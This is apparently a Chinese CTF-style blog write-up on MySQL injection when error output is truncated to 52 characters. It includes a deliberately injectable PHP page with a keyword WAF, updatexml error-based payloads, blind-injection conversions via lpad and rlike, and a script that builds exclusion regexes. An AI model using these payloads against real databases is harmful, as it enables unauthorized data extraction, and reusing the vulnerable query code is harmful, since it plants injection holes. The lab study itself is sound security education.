---
title: SQL注入回显长度限制情况下的分析
tags:
  - SQLi
  - 回显长度受限
categories: 
  - SQL注入
  - 回显长度受限分析
description: SQL注入回显长度受限分析
excerpt: SQL注入回显长度受限分析
typora-root-url: SQL注入回显长度限制情况下的分析
abbrlink: 19069
date: 2021-12-06 22:23:08
---

## SQL注入回显长度受限情况下的分析

> 这个问题是来自于一道题目，并非实战，但是感觉其实战意义存在，且该题的WP大多数人都未深入分析，自己来进行简单的分析。

### 1. 环境搭建

首先请创建数据库：

![image-20211206223608932](./image-20211206223608932.png)

注意，其中test库被程序默认使用，zzz_flag_db为flag所在库。

所有数据库中创建show表，结构为：

```sh
+---------+------------------+------+-----+---------+----------------+
| Field   | Type             | Null | Key | Default | Extra          |
+---------+------------------+------+-----+---------+----------------+
| id      | int(10) unsigned | NO   | PRI | NULL    | auto_increment |
| name    | varchar(40)      | NO   |     | NULL    |                |
| content | varchar(100)     | NO   |     | NULL    |                |
+---------+------------------+------+-----+---------+----------------+
```

在test.show中插入数据：

```sh
+----+------+---------------+
| id | name | content       |
+----+------+---------------+
|  1 | tips | Inject,please |
+----+------+---------------+
```

在zzz_flag_db.show中插入数据：

```sh
+----+------+--------------------------------------------------------------------------------------+
| id | name | content                                                                              |
+----+------+--------------------------------------------------------------------------------------+
|  1 | flag | TEST_FLAG{da38215b-098c-4549-9014-da95b78c51a5-1589002f-5429-44df-adcf-bf2bc91bccf5} |
+----+------+--------------------------------------------------------------------------------------+
```

PHP Script：

```php
<?php
require_once './conf.php';
$con = mysqli_connect(MYSQL_HOST, MYSQL_USER, MYSQL_PASSWORD, MYSQL_DB);

function waf($input)
{
    if (preg_match("/create|ascii|set|insert|and|union|substr|limit|pad|=|\/|\*|\&|\||\\s/i", $input)) {
        die("NO");
    }
}

if ($con) {
    $name = $_GET['name'];
    waf($name);
    if ($name !== 'flag') {
        $sql = "SELECT * FROM `show` WHERE `name`='$name'";
        $result = mysqli_query($con, $sql);
        $row = mysqli_fetch_array($result, MYSQLI_ASSOC);
        $str = '';
        if (mysqli_error($con)) {
            $str = mysqli_error($con);
        } else {
            $str = $row['name'] . " : " . $row['content'];
        }
        echo substr($str, 0, 52);
    } else {
        echo "name = tips?";
    }
} else {
    die("Could not connect to DB");
}

```

请自行将MySQL的配置写在conf.php中。

### 2. 获取所有数据库名

接下来我们思考一件事情，如何在上述的限制条件下，获取到所有的数据库名？

首先我们看常规注入，使用updatexml报错将信息带出来，传入：

```http
name=tips'or(updatexml(1,concat('~',database()),1))%23
```

此时可以得到回显为：

```http
XPATH syntax error: '~test'
```

这样可以获取到当前使用的数据库，但是问题是，我们需要所有的数据库名，如果使用`information_schema`库，传入：

```http
name=tips'or(updatexml(1,concat('~',(select(group_concat(distinct(table_schema)))from(information_schema.columns))),1))%23
```

此时可以得到回显为：

```http
XPATH syntax error: '~homework,information_schema,my
```

可以看到此时产生了回显截断，没有办法完整地读取出所有的数据库名，此时该怎么办呢？

#### 2.1 substr

一般来说此时我们容易想到的方案是substr，即将字符串截取分段带出，但是这里substr被ban了。

#### 2.2 转换为盲注

利用MySQL的lpad、left等函数可以简单地将此题转换为盲注，不妨考虑构造name为：

```http
name=1'or(lpad((select(group_concat(distinct(table_schema)))from(information_schema.columns)),1,1)>0x20)%23
```

这样子就将有回显注入转换为了盲注.

#### 2.3 rlike去除已知

上面虽然可以转换为盲注，但是有一个很严重的问题，盲注耗时长，且大量的请求容易被封禁，那么如何通过常规回显注入来获取所有的数据库名呢？

利用MySQL的`rlike`函数，我们来骚操作一下，去除已知的数据库，逐个数据库名获取，这样我们就能拿到所有的数据库名。

不妨考虑构造name为：

```http
name=1'or(updatexml(1,concat('~',(select(group_concat(distinct(table_schema)))from(information_schema.columns)where(not(table_schema)rlike('homework')))),1))%23
```

这样我们就将数据库名为homework的数据库去除了，可以得到回显：

```http
XPATH syntax error: '~information_schema,mysql,perfo
```

再次去除information_schema，构造name为：

```http
name=1'or(updatexml(1,concat('~',(select(group_concat(distinct(table_schema)))from(information_schema.columns)where(not(((table_schema)rlike('homework'))or((table_schema)rlike('information_schema')))))),1))%23
```

利用布尔表达式组合我们可以逐个去除已知数据库，但是这么做似乎有些复杂，有没有更简单的做法呢？

当然是有的，注意到题目过滤了符号`|`，但是对于`[]`以及`{}`为进行过滤，此时我们可以构造正则表达式如下，匹配`homework`、`information_schema`以及`mysql`：

```regex
[h,i,m]{1}[o,n,y]{1}[m,f,s]{1}[e,o,q]{1}[w,r,l]{1}[o,m]{0,1}[r,a]{0,1}[k,t]{0,1}[i]{0,1}[o]{0,1}[n]{0,1}[_]{0,1}[s]{0,1}[c]{0,1}[h]{0,1}[e]{0,1}[m]{0,1}[a]{0,1}
```

即传入：

```http
name=1'or(updatexml(1,concat('~',(select(group_concat(distinct(table_schema)))from(information_schema.columns)where(not(table_schema)rlike('[h,i,m]{1}[o,n,y]{1}[m,f,s]{1}[e,o,q]{1}[w,r,l]{1}[o,m]{0,1}[r,a]{0,1}[k,t]{0,1}[i]{0,1}[o]{0,1}[n]{0,1}[_]{0,1}[s]{0,1}[c]{0,1}[h]{0,1}[e]{0,1}[m]{0,1}[a]{0,1}')))),1))%23
```

看起来似乎更复杂了，是吗？但是其实这并不复杂，因为可以由脚本自动生成该正则表达式。

需要注意的是，这并不是精准匹配，如果有一个数据库名为homewrk的话，也会将其去除，但是一般而言，数据库的名字不会取得如此稀奇古怪，传入该参数可以得到：

```http
XPATH syntax error: '~performance_schema,sys,test,zz
```

> 这里其实本来test1、test2...test10都是为了能够把zzz_flag_db排序排到后面去，但是忘了在数据库里创表，所以不会在information_schema.columns里出现该库。

然后再去除performance_schema的话，修改正则为：

```regex
[h,i,m,p]{1}[o,n,y,e]{1}[m,f,s,r]{1}[e,o,q,f]{1}[w,r,l,o]{1}[o,m,r]{0,1}[r,a,m]{0,1}[k,t,a]{0,1}[i,n]{0,1}[o,c]{0,1}[n,e]{0,1}[_]{0,1}[s]{0,1}[c]{0,1}[h]{0,1}[e]{0,1}[m]{0,1}[a]{0,1}
```

传入后可以得到回显为：

```http
XPATH syntax error: '~sys,test,zzz_flag_db'
```

这里附上正则表达式生成的脚本：

```python
databases = ['homework', 'information_schema', 'mysql','performance_schema']

length = -1
minLength = 0x777

for database in databases:
    length = max(length, len(database))
    minLength = min(minLength, len(database))

payload = ''

for i in range(length):
    regexChar = '['
    for database in databases:
        if i < len(database):
            if  len(regexChar) >= 2:
                if database[i] != regexChar[-2]:
                    regexChar += database[i] + ','
            else:
                regexChar += database[i] + ','
    if i < minLength:
        regexChar = regexChar[:-1] + ']{1}'
    else:
        regexChar = regexChar[:-1] + ']{0,1}'
    payload += regexChar

print(payload)
```

### 3. rlike正则盲注

接下来看利用rlike正则进行盲注，注意到我们的Flag长度为84，但是我们每次显示的长度实际为52-20(XPATH提示信息)-1(波浪号~)=31个字符，这种情况下，substr被禁用(假设所有字符串截取函数均被禁用)，ascii被禁用(假设所有可以获取字符串对应位置的ACSII码函数均被禁用)，该怎么将整一个Flag带出来呢(利用left函数和right函数也只能带出62个字符，还差22个)？

此时还是用到了rlike，这可以轻松地将此题转换为一个盲注。

假设前面我们已经获取了表的结构，知道了列名。

不妨构造：

```http
name=1'or(updatexml(1,concat('~',(select('success')from(zzz_flag_db.show)where(content)rlike('TEST'))),1))%23
```

此时我们只要不断修改rlike的正则表达式，在其末尾追加字符，若响应报文中有success说明添加的字符正确。

为了保证严谨，将该正则表达式转换为16进制字符串后如下：

```http
name=1'or(updatexml(1,concat('~',(select('success')from(zzz_flag_db.show)where(content)rlike(0x54455354))),1))%23
```

> 总结：
>
> 本文总结了在回显长度受限情况下，如何通过rlike函数快速地获取有效信息以及如何在字符串截取函数以及获取位置ASCII码值函数禁用情况下使用rlike转换为盲注。
